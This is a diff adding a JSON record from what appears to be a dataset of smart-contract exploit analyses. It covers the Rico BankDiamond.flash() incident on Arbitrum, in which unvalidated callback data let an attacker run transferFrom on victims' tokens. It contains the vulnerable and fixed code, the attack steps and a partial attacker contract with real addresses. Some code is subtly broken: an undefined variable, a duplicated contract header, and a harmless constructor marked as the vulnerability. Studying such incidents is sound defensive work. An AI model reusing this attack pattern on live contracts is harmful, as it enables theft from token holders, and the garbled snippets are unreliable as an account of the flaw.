@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-04-XX_Rico_BankDiamondFlashArbitraryTransfer",
+ "source_file": "2024/2024-04-XX_Rico_BankDiamondFlashArbitraryTransfer.md",
+ "title": "Rico — BankDiamond.flash() Arbitrary transferFrom Execution Analysis",
+ "date": "2024-04-01",
+ "protocol": "Rico",
+ "chain": "Arbitrum",
+ "loss_raw": "~$36,000",
+ "loss_usd": 36000.0,
+ "root_cause": "The `BankDiamond.flash()` function forwards `transferFrom`-encoded callback data to the token contract without validation, allowing the attacker to unauthorized transfer token balances from specific token holders",
+ "attack_tx": null,
+ "vulnerable_contract": "BankDiamond 0x598C6c1c",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: flash() executes arbitrary token calls\ncontract BankDiamond {\n    function flash(\n        address token,\n        uint256 amount,\n        address callbackTarget,\n        bytes calldata data  // ← token.call(data) executed without validation\n    ) external {\n        // Flash loan token transfer\n        IERC20(token).transfer(callbackTarget, amount);\n\n        // Callback execution\n        // If data is transferFrom encoding, arbitrary transfer occurs\n        (bool ok,) = token.call(data);\n        require(ok);\n\n        // Repayment check\n        require(IERC20(token).balanceOf(address(this)) >= balanceBefore);\n    }\n}\n\n//",
+  "// File: BankDiamond.sol\ncontract MockERC20 {\ncontract MockERC20 is ERC20 {\n    constructor(\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {}  // ❌ Vulnerability\n\n    function mint(address _account, uint256 _amount) public returns (bool) {\n        _mint(_account, _amount);\n\n        return true;\n    }\n\n    function burnFrom(address _account, uint256 _amount) public returns (bool) {\n        _burn(_account, _amount);\n\n        return true;\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: flash() handles only lending/repayment, arbitrary calls prohibited\nfunction flash(address token, uint256 amount, address recipient, bytes calldata userData) external {\n    uint256 balBefore = IERC20(token).balanceOf(address(this));\n    IERC20(token).transfer(recipient, amount);\n\n    // User callback (called only on the recipient contract, unrelated to the token address)\n    IFlashBorrower(recipient).onFlashLoan(token, amount, userData);\n\n    // Repayment validation\n    require(IERC20(token).balanceOf(address(this)) >= balBefore, \"not repaid\");\n}"
+ ],
+ "steps": [
+  "→ [1] BankDiamond.flash(ARB, 0, attacker, transferFromData)",
+  "ARB.call(data) → transferFrom executed",
+  "victim's ARB → transferred to attacker",
+  "→ [2] Same pattern to drain LINK, wstETH, WETH",
+  "→ [3] Drained tokens → swapped for USDC (Uniswap V3)",
+  "→ [4] ~$36K stolen"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] BankDiamond.flash(ARB, 0, attacker, transferFromData)\n  │         └─ data = abi.encode(transferFrom, victim, attacker, victimBal)\n  │         └─ ARB.call(data) → transferFrom executed\n  │         └─ victim's ARB → transferred to attacker\n  │\n  ├─→ [2] Same pattern to drain LINK, wstETH, WETH\n  │\n  ├─→ [3] Drained tokens → swapped for USDC (Uniswap V3)\n  │\n  └─→ [4] ~$36K stolen",
+  "interface IBankDiamond {\n    function flash(address token, uint256 amount, address callbackTarget, bytes calldata data) external;\n}\n\ninterface IUniV3Router {\n    struct ExactInputSingleParams {\n        address tokenIn; address tokenOut; uint24 fee;\n        address recipient; uint256 deadline;\n        uint256 amountIn; uint256 amountOutMinimum; uint160 sqrtPriceLimitX96;\n    }\n    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256);\n}\n\ncontract AttackContract {\n    IBankDiamond constant bank   = IBankDiamond(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b);\n    IUniV3Router constant router = IUniV3Router(/* Uniswap V3 Router */);\n\n    address[] tokens = [\n        0x912CE59144191C1204E64559FE8253a0e49E6548, // ARB\n        0xf97f4df75117a78c1A5a0DBb814Af924"
+ ]
+}
